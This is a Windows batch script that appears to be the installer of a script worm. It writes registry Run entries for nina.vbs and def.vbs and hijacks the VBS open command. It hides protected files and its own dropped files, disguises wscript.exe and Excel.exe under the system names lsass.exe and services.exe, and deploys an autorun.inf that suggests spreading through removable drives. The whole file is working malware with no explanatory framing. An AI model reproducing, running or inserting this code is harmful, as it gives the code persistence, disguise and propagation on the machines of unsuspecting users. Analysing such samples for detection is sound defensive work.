@echo off
if exist %windir%\win32.sys goto :777
echo Y | reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /d dword:00000000 /f
echo Y | reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v Services /d %windir%\system32\nina.vbs /f
echo Y | reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v WinProtect /d %windir%\system32\def.vbs /f
echo Y | reg add "hkey_classes_root\VBSFile\Shell\Open\Command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\system\lsass.exe %%1 %%*%"
:777
attrib +h +a +r +s %windir%\system32\system.bat
attrib +h +a +r +s %windir%\system32\nina.vbs
attrib +h +a +r +s %windir%\system32\nina.bat
attrib +h +a +r +s %windir%\system32\autorun.inf
attrib +h +a +r +s %windir%\system32\def.vbs
attrib +h +a +r +s %windir%\system32\update.bat
copy system.bat %windir%\system\system.bat
copy nina.vbs %windir%\system\nina.vbs
copy nina.bat %windir%\system\nina.bat
copy autorun.inf %windir%\system\autorun.inf
copy def.vbs %windir%\system\def.vbs
copy update.bat %windir%\system\update.bat
attrib -h -a -r -s %windir%\system\system.bat
attrib -h -a -r -s %windir%\system\nina.vbs
attrib -h -a -r -s %windir%\system\nina.bat
attrib -h -a -r -s %windir%\system\autorun.inf
attrib -h -a -r -s %windir%\system\def.vbs
attrib -h -a -r -s %windir%\system\update.bat
if exist %windir%\system\lsass.exe goto :333
copy %windir%\system32\wscript.exe %windir%\system\lsass.exe
:333
if exist %windir%\system\services.exe goto :444
if exist %systemdrive%\Progra~1\Micros~2\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~2\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~2\Office13\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~1\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~1\Office13\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~3\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~3\Office13\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~4\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~4\Office13\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office08\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office08\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office8\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office8\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office09\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office09\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office9\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office9\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office10\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office10\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office11\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office11\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office12\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office12\Excel.exe %windir%\system\services.exe
if exist %systemdrive%\Progra~1\Micros~5\Office13\Excel.exe copy %systemdrive%\Progra~1\Micros~5\Office13\Excel.exe %windir%\system\services.exe
echo 8489498484
echo 8489498484
echo 8489498484
echo 8489498484
:444
%windir%\system\def.vbs
if not "%M"=="" goto 888
if exist nina.vbs start nina.vbs&exit
if exist %windir%\system32\nina.vbs start %windir%\system32\nina.vbs&exit
exit
:888
exit




